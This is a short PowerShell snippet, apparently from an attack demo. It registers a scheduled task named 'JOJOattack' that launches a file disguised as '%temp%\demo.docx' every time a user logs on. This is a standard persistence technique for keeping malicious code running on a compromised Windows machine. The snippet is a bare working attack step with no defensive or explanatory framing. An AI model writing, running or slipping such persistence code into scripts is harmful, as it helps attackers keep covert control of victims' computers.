$Sx = New-ScheduledTaskAction -Execute "%temp%\demo.docx"
$FF = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask JOJOattack -Action $Sx -Trigger $FF
